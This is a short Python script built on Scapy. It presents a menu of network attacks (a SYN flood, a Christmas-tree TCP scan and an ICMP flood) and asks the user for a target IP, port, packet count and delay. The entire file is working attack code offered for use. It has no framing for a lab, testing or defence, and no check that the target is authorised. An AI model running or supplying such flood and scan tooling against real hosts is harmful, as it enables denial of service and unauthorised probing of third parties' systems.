from scapy.all import send, IP, TCP, ICMP, sniff
import time

# Attack function where the user chooses one of the three:
def attack(target_ip, target_port=None, ports=None, packet_count=10, delay=0, attack_type="syn"):
    print(f"Starting {attack_type.upper()} attack on {target_ip}")

    if attack_type == "syn":
        for _ in range(packet_count):
            send(IP(dst=target_ip) / TCP(dport=target_port, flags="S"), verbose=False)
            time.sleep(delay)
    elif attack_type == "xmas":
        for port in ports:
            for _ in range(packet_count):
                send(IP(dst=target_ip) / TCP(dport=port, flags="FPU"), verbose=False)
                time.sleep(delay)
    elif attack_type == "icmp":
        for _ in range(packet_count):
            send(IP(dst=target_ip) / ICMP(), verbose=False)
            time.sleep(delay)

    print(f"{attack_type.upper()} attack completed.")

# User input
def get_user_input():
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port: "))
    packet_count = int(input("Enter the number of packets: "))
    delay = float(input("Enter the delay between packets (in seconds): "))

    return target_ip, target_port, packet_count, delay

# Main Menu
def main():
    print("Choose the type of attack:")
    print("1. SYN Flood")
    print("2. Christmas Tree Scan")
    print("3. ICMP Flood")
    attack_type = input("Enter the number corresponding to the attack type (1/2/3): ")

    # Get user input
    target_ip, target_port, packet_count, delay = get_user_input()

    # Attack types to get right attack function
    if attack_type == "1":
        attack(target_ip, target_port=target_port, packet_count=packet_count, delay=delay, attack_type="syn")
    elif attack_type == "2":
        ports = [target_port]  # You can extend this to take multiple ports if needed
        attack(target_ip, ports=ports, packet_count=packet_count, delay=delay, attack_type="xmas")
    elif attack_type == "3":
        attack(target_ip, packet_count=packet_count, delay=delay, attack_type="icmp")
    else:
        print("Invalid attack type selected.")


if __name__ == "__main__":
    main()
